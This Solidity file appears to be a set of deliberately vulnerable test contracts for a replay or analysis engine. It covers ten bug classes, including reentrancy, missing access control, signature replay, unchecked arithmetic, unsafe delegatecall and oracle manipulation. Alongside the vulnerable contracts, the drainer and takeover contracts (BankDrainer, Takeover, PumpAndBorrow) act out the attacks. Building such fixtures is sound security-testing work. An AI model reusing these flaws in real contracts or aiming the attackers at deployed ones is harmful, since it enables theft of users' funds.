// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Token} from "./Token.sol";

// Deliberately vulnerable contracts that exercise the replay engine. Never deploy them.

// 1. initializer that can run twice
contract ReinitVault {
    address public owner;
    function initialize(address o) external { owner = o; }
    function sweep() external { require(msg.sender == owner, "owner"); payable(owner).transfer(address(this).balance); }
    receive() external payable {}
}

// 2. fee recipient setter without access control
contract OpenSetter {
    address public owner;
    address public feeRecipient;
    constructor() { owner = msg.sender; feeRecipient = msg.sender; }
    function setFeeRecipient(address r) external { feeRecipient = r; }
    function withdrawFees() external { payable(feeRecipient).transfer(address(this).balance); }
    receive() external payable {}
}

// 3. external call before the balance is cleared
contract ReentrantBank {
    address public owner;
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;
    constructor() { owner = msg.sender; }
    function deposit() external payable { balances[msg.sender] += msg.value; totalDeposits += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "send");
        balances[msg.sender] = 0;
        unchecked { totalDeposits -= amount; }
    }
    function solvency() external view returns (uint256) { return address(this).balance; }
}

contract BankDrainer {
    ReentrantBank bank;
    address payable immutable boss;
    constructor(ReentrantBank b) payable { bank = b; boss = payable(msg.sender); }
    function run() external { bank.deposit{value: address(this).balance}(); bank.withdraw(); boss.transfer(address(this).balance); }
    receive() external payable { if (address(bank).balance >= msg.value && msg.value > 0) bank.withdraw(); }
}

// 4. redeem pays out without burning shares
contract LeakyVault {
    address public owner;
    mapping(address => uint256) public shares;
    uint256 public totalSupply;
    constructor() { owner = msg.sender; }
    function deposit() external payable { shares[msg.sender] += msg.value; totalSupply += msg.value; }
    function redeem(uint256 amount) external {
        require(shares[msg.sender] >= amount, "shares");
        payable(msg.sender).transfer(amount);
    }
    function totalAssets() external view returns (uint256) { return address(this).balance; }
}

// 5. signed voucher without a nonce
contract VoucherDesk {
    address public owner;
    address public signer;
    constructor(address s) { owner = msg.sender; signer = s; }
    function redeem(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(abi.encode(address(this), to, amount))));
        require(ecrecover(digest, v, r, s) == signer, "sig");
        payable(msg.sender).transfer(amount);
    }
    receive() external payable {}
}

// 6. unchecked subtraction in transfer
contract UncheckedToken {
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    constructor(uint256 supply) { owner = msg.sender; totalSupply = supply; balanceOf[msg.sender] = supply; }
    function transfer(address to, uint256 amount) external returns (bool) {
        unchecked { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; }
        return true;
    }
}

// 7. arbitrary call from a contract that holds tokens
contract Relayer {
    address public owner;
    constructor() { owner = msg.sender; }
    function relay(address target, bytes calldata data) external returns (bytes memory out) {
        (bool ok, bytes memory res) = target.call(data);
        require(ok, "call");
        return res;
    }
}

// 8. unauthenticated delegatecall
contract Runner {
    address public owner;
    constructor() { owner = msg.sender; }
    function run(address lib, bytes calldata data) external { (bool ok,) = lib.delegatecall(data); require(ok, "run"); }
    function sweep() external { require(msg.sender == owner, "owner"); payable(owner).transfer(address(this).balance); }
    receive() external payable {}
}

contract Takeover {
    address public owner;
    function pwn() external { owner = tx.origin; }
}

// 9. collateral priced from the pool's live reserves
contract SpotPool {
    Token public immutable token;
    constructor(Token t) payable { token = t; }
    function price() public view returns (uint256) { return address(this).balance * 1e6 / token.balanceOf(address(this)); }
    function buy() external payable { uint256 out = token.balanceOf(address(this)) * msg.value / (address(this).balance); token.transfer(msg.sender, out); }
}

contract SpotLender {
    address public owner;
    Token public immutable token;
    SpotPool public immutable pool;
    mapping(address => uint256) public collateral;
    uint256 public lent;
    constructor(Token t, SpotPool p) { owner = msg.sender; token = t; pool = p; }
    function depositCollateral(uint256 amount) external { token.transferFrom(msg.sender, address(this), amount); collateral[msg.sender] += amount; }
    function borrow(uint256 amount) external {
        require(collateral[msg.sender] * pool.price() / 1e6 >= amount * 2, "collateral");
        lent += amount;
        payable(msg.sender).transfer(amount);
    }
    receive() external payable {}
}

contract PumpAndBorrow {
    constructor(SpotPool pool, SpotLender lender, Token token) payable {
        pool.buy{value: msg.value}();
        uint256 bal = token.balanceOf(address(this));
        token.approve(address(lender), bal);
        lender.depositCollateral(bal);
        lender.borrow(address(lender).balance);
        payable(tx.origin).transfer(address(this).balance);
    }
}

// 10. an upgrade that drops the owner check
contract Proxy {
    bytes32 constant IMPL = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    event Upgraded(address indexed implementation);
    event AdminChanged(address previousAdmin, address newAdmin);
    constructor(address impl) { _set(IMPL, impl); _set(ADMIN, msg.sender); emit Upgraded(impl); }
    function upgradeTo(address impl) external { require(msg.sender == _get(ADMIN), "admin"); _set(IMPL, impl); emit Upgraded(impl); }
    function changeAdmin(address a) external { require(msg.sender == _get(ADMIN), "admin"); emit AdminChanged(_get(ADMIN), a); _set(ADMIN, a); }
    function _set(bytes32 slot, address v) private { assembly { sstore(slot, v) } }
    function _get(bytes32 slot) private view returns (address v) { assembly { v := sload(slot) } }
    fallback() external payable {
        address impl = _get(IMPL);
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) }
        }
    }
}

contract VaultV1 {
    address public owner;
    function init(address o) external { require(owner == address(0), "init"); owner = o; }
    function withdraw(address to, uint256 amount) external { require(msg.sender == owner, "owner"); payable(to).transfer(amount); }
    function totalAssets() external view returns (uint256) { return address(this).balance; }
    receive() external payable {}
}

contract VaultV2 {
    address public owner;
    function init(address o) external { require(owner == address(0), "init"); owner = o; }
    function withdraw(address to, uint256 amount) external { payable(to).transfer(amount); }
    function totalAssets() external view returns (uint256) { return address(this).balance; }
    receive() external payable {}
}
